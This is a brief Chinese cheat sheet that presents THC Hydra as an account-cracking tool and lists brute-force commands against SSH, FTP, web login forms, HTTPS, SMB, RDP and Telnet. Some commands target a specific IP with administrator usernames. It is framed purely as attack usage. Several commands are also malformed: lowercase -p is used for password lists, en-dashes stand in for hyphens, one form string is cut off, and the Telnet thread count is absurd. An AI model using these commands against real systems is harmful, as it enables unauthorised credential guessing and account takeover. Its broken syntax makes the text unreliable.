#hydra 网络账号破解神器

---

Hydra –L 文件路径 –P 密码路径 t 线程 –vV 详细显示 –o 指定生成路径 –f 找到密码就停止 –e ns 空密码和指定密码试探 ip service 爆破服务

爆破ssh：

hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh

hydra -l 用户名 -p 密码字典 -t 线程 -o /1 -vV ip ssh

爆破ftp：

hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) –vV

hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV

爆破web登录(get)：

hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get/admin/

hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get/admin/index.PHP

爆破web登录(post)：

hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form"/admin/login.php:user

hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form"login.php:id=USER&passwd=PASS:"

https爆破：

hydra -m /index.php -l admin -P pass.txt 10.36.16.18 https

smb爆破：

hydra -l administrator -P pass.txt 10.36.16.18 smb

rdp爆破：

hydra -l administrator -P pass.txt –o /root/1 –V rdp://ip

telnet爆破：

hydra ip telnet -L 用户 -P 密码 -e ns -f -v -t 1000000000000000
